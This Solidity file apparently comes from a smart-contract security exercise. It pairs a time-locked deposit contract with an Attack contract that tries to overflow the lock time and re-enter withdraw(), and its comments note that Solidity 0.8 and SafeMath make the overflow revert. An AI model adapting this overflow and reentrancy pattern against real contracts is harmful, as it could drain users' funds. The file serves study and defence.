/* 
    Make a contract that:
        user can deposit money into, but can't withdraw for at least a week
        User can extend the time to withdraw money

    Attack it, check for 2 way: reentrancy attack & overflow attack
        - Check if can make lock time overflow to reset it -> withdraw before deadline
        - If overflow successful, try to reentrancy attack
    
    => For solidity < 0.8, overflow attack can success; >= 0.8 it throw errors
    To make sure, use SafeMath
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract TimeLock {
    using SafeMath for uint;

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function extendTime(uint _seconds) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_seconds);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "No funds to withdraw!");
        require(lockTime[msg.sender] < block.timestamp, "It is not time yet to withdraw!");

        // Do this is also a way to avoid reentrancy attack, assign value to 0 1st
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require (sent, "Transaction failed");
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }

    function checkTimeLock() public view returns (uint) {
        return lockTime[msg.sender];
    }
}

contract Attack {
    TimeLock public timelock;

    constructor(address _timelock) {
        timelock = TimeLock(_timelock);
    }

    fallback() payable external {
        if (timelock.checkBalance() >= 1 ether) {
            timelock.extendTime(
                type(uint).max + 1 - timelock.lockTime(address(this))
            );
            timelock.withdraw();    
        }
    }

    function attack() payable external {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        timelock.deposit{value: 1 ether}();
        /*
            t = current lock time
            try to increase delta (sec) that:
                t + delta = 2 ** 256 = 0 (overflow error)
                -> delta = 2 * 256 - t
        */
        timelock.extendTime(
            type(uint).max + 1 - timelock.lockTime(address(this))
        );
        timelock.withdraw();
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }    
}